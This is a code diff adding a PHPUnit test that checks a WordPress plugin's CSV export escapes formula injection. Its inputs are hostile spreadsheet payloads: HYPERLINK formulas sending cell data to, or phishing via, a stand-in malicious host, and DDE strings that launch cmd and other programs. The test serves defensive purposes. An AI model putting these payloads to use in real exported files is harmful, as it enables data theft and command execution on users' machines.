@@ -99,4 +99,55 @@ class WordCampTalkProposalsTest_Core_Functions extends WordCampTalkProposalsTest
 	public function test_wct_is_signup_allowed() {
 		$this->assertTrue( wct_is_wordcamp_site() );
 	}
+
+	public function sanitize_csv( $content ) {
+		return str_replace( array( '&#8212;', '"' ), array( 0, "'" ), $content );
+	}
+
+	/**
+	 * @covers wct_generate_csv_content
+	 * @group esc_csv
+	 */
+	public function test_wct_generate_csv_content() {
+		$test_input = array(
+			// Safe
+			'WordCamp Talks',
+
+			// Cells starting with trigger characters
+			'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
+			'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
+			"-2+3+cmd|' /C mstsc'!A0",
+			"+2+3+cmd|' /C mspaint'!A0",
+			";2+3+cmd|' /C calc'!A0",
+
+			// Cells split by delimiters
+			"foo ;=cmd|' /C SoundRecorder'!A0",
+			"foo\n-2+3+cmd|' /C explorer'!A0",
+			"   -2+3+cmd|' /C notepad'!A0",
+			" -2+3+cmd|' /C calc'!A0",
+		);
+
+		$expected_output = array(
+			// Safe
+			'WordCamp Talks',
+
+			// Cells starting with trigger character
+			'\'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
+			'\'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
+			"'-2+3+cmd|' /C mstsc'!A0",
+			"'+2+3+cmd|' /C mspaint'!A0",
+			"';2+3+cmd|' /C calc'!A0",
+
+			// Cells split by delimiters
+			"foo ;'=cmd|' /C SoundRecorder'!A0",
+			"foo '-2+3+cmd|' /C explorer'!A0",
+			"'-2+3+cmd|' /C notepad'!A0",
+			"'-2+3+cmd|' /C calc'!A0",
+		);
+
+		$this->assertEquals(
+			array_map( array( $this, 'sanitize_csv' ), $expected_output ),
+			array_map( 'wct_generate_csv_content', $test_input )
+		);
+	}
 }
